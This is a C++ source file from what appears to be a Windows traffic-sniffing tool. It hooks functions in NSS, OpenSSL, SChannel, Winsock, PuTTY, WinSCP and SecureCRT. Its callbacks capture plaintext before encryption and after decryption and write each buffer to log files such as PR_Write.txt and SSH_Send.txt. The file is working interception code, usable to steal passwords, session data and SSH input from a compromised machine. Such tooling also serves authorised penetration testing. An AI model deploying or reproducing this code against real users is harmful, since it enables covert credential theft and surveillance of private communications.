
#include "stdafx.h"
#include "HookedFunctions.h"

// Variables (function pointers)

PR_Write_Typedef PR_Write_Original;
PR_Read_Typedef PR_Read_Original;
PR_GetDescType_Typedef PR_GetDescType_Original;

SSL_Write_Typedef64 SSL_Write_Original64;
SSL_Read_Typedef64 SSL_Read_Original64;

SSL_Write_Typedef32 SSL_Write_Original32;
SSL_Read_Typedef32 SSL_Read_Original32;

PR_Send_Typedef PR_Send_Original;
PR_Recv_Typedef PR_Recv_Original;

SSH_Pktsend_Typedef SSH_Pktsend_Original;
SSH_Rdpkt_Typedef SSH_Rdpkt_Original;

SslEncryptPacket_Typedef SslEncryptPacket_Original;
SslDecryptPacket_Typedef SslDecryptPacket_Original;

send_Typedef send_Original;
recv_Typedef recv_Original;

WSASend_Typedef WSASend_Original;
WSARecv_Typedef WSARecv_Original;

EncryptMessage_Typedef EncryptMessage_Original;
DecryptMessage_Typedef DecryptMessage_Original;

PuttySend_Typedef PuttySend_Original;
PuttyRecv_Typedef PuttyRecv_Original;

SecureCRT_Typedef SecureCRT_Original;

// PR_Write callback

int PR_Write_Callback(void *fd, void *buffer, DWORD amount)
{
	LONG res;

	if(FunctionFlow::CheckFlag() == FALSE)
	{
		// Check if this is traffic

		if( (PR_GetDescType_Original(fd) == 2 || PR_GetDescType_Original(fd) == 4) && buffer != NULL) 
		{
				PluginSystem::ProcessAndSaveWrite("PR_Write.txt", (unsigned char *)buffer, amount);
		}
	}

	// Call original function

	res = PR_Write_Original(fd, buffer, amount);

	FunctionFlow::UnCheckFlag();

	return res;
}

// PR_Read callback

int PR_Read_Callback(void *fd, void *buffer, DWORD amount)
{
	BOOL bFlag = FunctionFlow::CheckFlag();
	signed int ret = PR_Read_Original(fd, buffer, amount);

	// Do things

	if(bFlag == FALSE)
	{
		if((PR_GetDescType_Original(fd) == 2 || PR_GetDescType_Original(fd) == 4) && ret > 0)
			PluginSystem::ProcessAndSaveRead("PR_Read.txt", (unsigned char *)buffer, ret);
	}

	FunctionFlow::UnCheckFlag();

	return ret;
}

// SSL_Write callback 64 bits

int SSL_Write_Callback64(void *fd, void *buffer, int amount)
{
	LONG res;

	// If allowed

	if(FunctionFlow::CheckFlag() == FALSE)
	{
		PluginSystem::ProcessAndSaveWrite("SSL_Write.txt", (unsigned char *)buffer, amount);
	}

	// Call original function
	
	res = SSL_Write_Original64(fd, buffer, amount);

	FunctionFlow::UnCheckFlag();

	return res;
}

// SSL_Read callback 64 bits

int SSL_Read_Callback64(void *fd, void *buffer, int amount)
{
	BOOL bFlag = FunctionFlow::CheckFlag();
	int ret = SSL_Read_Original64(fd, buffer, amount);

	// Do things

	if (bFlag == FALSE)
	{
		if(ret > 0) PluginSystem::ProcessAndSaveRead("SSL_Read.txt", (unsigned char *)buffer, ret);
	}

	FunctionFlow::UnCheckFlag();

	return ret;
}

// SSL_Write callback 32 bits

int SSL_Write_Callback32(void *fd, void *buffer, int amount)
{
	LONG res;

	// If allowed

	if (FunctionFlow::CheckFlag() == FALSE)
	{
		PluginSystem::ProcessAndSaveWrite("SSL_Write.txt", (unsigned char *)buffer, amount);
	}

	// Call original function

	res = SSL_Write_Original32(fd, buffer, amount);

	FunctionFlow::UnCheckFlag();

	return res;
}

// SSL_Read callback 32 bits

int SSL_Read_Callback32(void *fd, void *buffer, int amount)
{
	BOOL bFlag = FunctionFlow::CheckFlag();
	int ret = SSL_Read_Original32(fd, buffer, amount);

	// Do things

	if (bFlag == FALSE)
	{
		if (ret > 0) PluginSystem::ProcessAndSaveRead("SSL_Read.txt", (unsigned char *)buffer, ret);
	}

	FunctionFlow::UnCheckFlag();

	return ret;
}

// PR_Send callback

int PR_Send_Callback(void *fd, const void *buf, int amount, int flags, DWORD timeout)
{
	LONG res;

	// Do things

	if(FunctionFlow::CheckFlag() == FALSE)
	{
		if(buf != NULL && amount > 0)
		{
			PluginSystem::ProcessAndSaveWrite("PR_Send.txt", (unsigned char *)buf, amount);
		}
	}

	// Call original function

	res = PR_Send_Original(fd, buf, amount, flags, timeout);

	FunctionFlow::UnCheckFlag();

	return res;
}

// PR_Recv callback

int PR_Recv_Callback(void *fd, void *buf, int amount, int flags, DWORD timeout)
{
	BOOL bFlag = FunctionFlow::CheckFlag();
	signed int ret = PR_Recv_Original(fd, buf, amount, flags, timeout);

	// Do things

	if(bFlag == FALSE)
	{
		if(ret > 0)
			PluginSystem::ProcessAndSaveRead("PR_Recv.txt", (unsigned char *)buf, ret);
	}

	FunctionFlow::UnCheckFlag();

	return ret;
}

// SslEncryptPacket

LONG __stdcall SslEncryptPacket_Callback(ULONG_PTR hSslProvider, ULONG_PTR hKey, PBYTE *pbInput, DWORD cbInput, PBYTE pbOutput, DWORD cbOutput, DWORD *pcbResult, ULONGLONG SequenceNumber, DWORD dwContentType, DWORD dwFlags)
{
	LONG res;

	// Do things

	if(FunctionFlow::CheckFlag() == FALSE)
	{
		if(pbInput != NULL && cbInput > 0) 
		{
			PluginSystem::ProcessAndSaveWrite("SslEncryptPacket.txt", (unsigned char *)pbInput, cbInput);
		}
	}

	// Call original function

	res = SslEncryptPacket_Original(hSslProvider, hKey, pbInput, cbInput, pbOutput, cbOutput, pcbResult, SequenceNumber, dwContentType, dwFlags);

	FunctionFlow::UnCheckFlag();

	return res;
}

// SslDecryptPacket

LONG __stdcall SslDecryptPacket_Callback(ULONG_PTR hSslProvider, ULONG_PTR hKey, PBYTE *pbInput, DWORD cbInput,
	PBYTE pbOutput, DWORD cbOutput, DWORD *pcbResult, ULONGLONG SequenceNumber, DWORD dwFlags)
{
	BOOL bFlag = FunctionFlow::CheckFlag();
	LONG res = SslDecryptPacket_Original(hSslProvider, hKey, pbInput, cbInput, pbOutput, cbOutput, pcbResult, SequenceNumber, dwFlags);

	// Do things

	if(bFlag == FALSE)
	{
		if(pcbResult > 0) 
			PluginSystem::ProcessAndSaveRead("SslDecryptPacket.txt", (unsigned char *)pbOutput, *pcbResult);
	}

	FunctionFlow::UnCheckFlag();

	return res;
}

// send callback

int __stdcall send_Callback(int s, char *buf, int len, int flags)
{
	LONG res;

	// Do things

	if(FunctionFlow::CheckFlag() == FALSE)
	{
		if(buf != NULL && len > 0)
		{
			PluginSystem::ProcessAndSaveWrite("send.txt", (unsigned char *)buf, len);
		}
	}

	// Call original function

	res = send_Original(s, buf, len, flags);

	FunctionFlow::UnCheckFlag();

	return res;
}

// recv callback

int __stdcall recv_Callback(int s, char *buf, int len, int flags)
{
	BOOL bFlag = FunctionFlow::CheckFlag();
	signed int ret = recv_Original(s, buf, len, flags);

	// Do things

	if(bFlag == FALSE)
	{
		if(ret > 0)
			PluginSystem::ProcessAndSaveRead("recv.txt", (unsigned char *)buf, ret);
	}

	FunctionFlow::UnCheckFlag();

	return ret;
}

// WSASend callback

int __stdcall WSASend_Callback(int s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesSent, 
	DWORD dwFlags, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)
{
	int res;

	// Do things

	if(FunctionFlow::CheckFlag() == FALSE)
	{
		if(lpBuffers != NULL && dwBufferCount > 0)
		{
			for(DWORD i = 0; i < dwBufferCount; i++)
			{
				PluginSystem::ProcessAndSaveWrite("WSASend.txt", (unsigned char *)lpBuffers[i].buf, lpBuffers[i].len);
			}
		}
	}

	// Call original function

	res = WSASend_Original(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags, lpOverlapped, lpCompletionRoutine);

	FunctionFlow::UnCheckFlag();

	return res;
}

// WSARecv callback

int __stdcall WSARecv_Callback(int s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesRecvd, 
	LPDWORD lpFlags, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)
{
	BOOL bFlag = FunctionFlow::CheckFlag();
	int ret = WSARecv_Original(s, lpBuffers, dwBufferCount, lpNumberOfBytesRecvd, lpFlags, lpOverlapped, lpCompletionRoutine);

	// Do things

	if(bFlag == FALSE)
	{
		if(ret == 0)
		{
			for(DWORD i = 0; i < dwBufferCount; i++)
			{
				PluginSystem::ProcessAndSaveRead("WSARecv.txt", (unsigned char *)lpBuffers[i].buf, lpBuffers[i].len);
			}
		}
	}

	FunctionFlow::UnCheckFlag();

	return ret;
}

// EncryptMessage

SECURITY_STATUS __stdcall EncryptMessage_Callback(PCtxtHandle phContext, ULONG fQOP, PSecBufferDesc pMessage, ULONG MessageSeqNo)
{
	SECURITY_STATUS res;

	// Do things

	if(FunctionFlow::CheckFlag() == FALSE)
	{
		if(pMessage->pBuffers != NULL && pMessage->cBuffers > 0)
		{
			for(DWORD i = 0; i < pMessage->cBuffers; i++)
			{
				SecBuffer buf = pMessage->pBuffers[i];

				if(buf.BufferType == SECBUFFER_DATA) 
					PluginSystem::ProcessAndSaveWrite("EncryptMessage.txt", (unsigned char *)buf.pvBuffer, buf.cbBuffer);
			}
		}
	}

	// Call original function

	res = EncryptMessage_Original(phContext, fQOP, pMessage, MessageSeqNo);

	FunctionFlow::UnCheckFlag();

	return res;
}

// DecryptMessage

SECURITY_STATUS __stdcall DecryptMessage_Callback(PCtxtHandle phContext, PSecBufferDesc pMessage, ULONG MessageSeqNo, PULONG pfQOP)
{
	BOOL bFlag = FunctionFlow::CheckFlag();
	int ret = DecryptMessage_Original(phContext, pMessage, MessageSeqNo, pfQOP);

	// Do things

	if(bFlag == FALSE)
	{
		if(ret == SEC_E_OK)
		{
			if(pMessage->pBuffers != NULL && pMessage->cBuffers > 0)
			{
				for(DWORD i = 0; i < pMessage->cBuffers; i++)
				{
					SecBuffer buf = pMessage->pBuffers[i];

					if(buf.BufferType == SECBUFFER_DATA) 
						PluginSystem::ProcessAndSaveRead("DecryptMessage.txt", (unsigned char *)buf.pvBuffer, buf.cbBuffer);
				}
			}
		}
	}

	FunctionFlow::UnCheckFlag();

	return ret;
}

// PuttySend callback

void PuttySend_Callback(void *handle, char *buf, int len, int interactive)
{
	// If allowed

	if(FunctionFlow::CheckFlag() == FALSE)
	{
		if(buf != NULL) PluginSystem::ProcessAndSaveWrite("PuttySend.txt", (unsigned char *)buf, len);
	}

	// Call original function
	
	PuttySend_Original(handle, buf, len, interactive);

	FunctionFlow::UnCheckFlag();
}

// PuttyRecv callback

int PuttyRecv_Callback(void *term, int is_stderr, const char *data, int len)
{
	BOOL bFlag = FunctionFlow::CheckFlag();
	signed int ret = PuttyRecv_Original(term, is_stderr, data, len);

	// Do things

	if(bFlag == FALSE)
	{
		if(data != NULL) PluginSystem::ProcessAndSaveRead("PuttyRecv.txt", (unsigned char *)data, len);
	}

	FunctionFlow::UnCheckFlag();

	return ret;
}

// SSH_Pktsend - WinSCP send callback

void __fastcall SSH_Pktsend_Callback(int datalen, unsigned char *data)
{
	DWORD pThis = 0;

	// Backup EAX register

#if defined _M_IX86
	__asm { mov pThis, EAX }
#endif 

	// If allowed

	if(FunctionFlow::CheckFlag() == FALSE)
	{
		if(data != NULL && datalen > 0) PluginSystem::ProcessAndSaveWrite("SSH_Send.txt", data, datalen);
	}

	// Restore EAX register

#if defined _M_IX86
	__asm { mov EAX, pThis }
#endif

	// Call original function
	
	SSH_Pktsend_Original(datalen, data);

	FunctionFlow::UnCheckFlag();
}

// SSH_Rdpkt - WinSCP receive callback

int __fastcall SSH_Rdpkt_Callback(int datalen, unsigned char *data)
{
	DWORD pThis = 0;

	// Backup EAX register

#if defined _M_IX86
	__asm { mov pThis, EAX }
#endif

	BOOL bFlag = FunctionFlow::CheckFlag();

	// Restore EAX register

#if defined _M_IX86
	__asm { mov EAX, pThis }
#endif

	int ret = SSH_Rdpkt_Original(datalen, data);

	// Do things

	if(bFlag == FALSE)
	{
		if(data != NULL && datalen > 0) PluginSystem::ProcessAndSaveRead("SSH_Receive.txt", data, datalen);
	}

	FunctionFlow::UnCheckFlag();

	return ret;
}

// SecureCRT_Write callback

int __stdcall SecureCRT_Callback(unsigned char **data, DWORD size)
{
#if defined _M_IX86
	DWORD ecx_bkp = 0;
	__asm { mov ecx_bkp, ecx };
#endif

	// Stuff required to avoid overwriting ECX
	
	unsigned char **temp_data = data;
	DWORD temp_size = size;
	
	BOOL bFlag = FunctionFlow::CheckFlag();

#if defined _M_IX86
	__asm { mov ecx, ecx_bkp };
#endif

	int ret = SecureCRT_Original(temp_data, temp_size);

	// Do things

	if (bFlag == FALSE)
	{
		if (*data != NULL) PluginSystem::ProcessAndSaveRead("SecureCRT.txt", (*data), size);
	}

	FunctionFlow::UnCheckFlag();

	return ret;
}
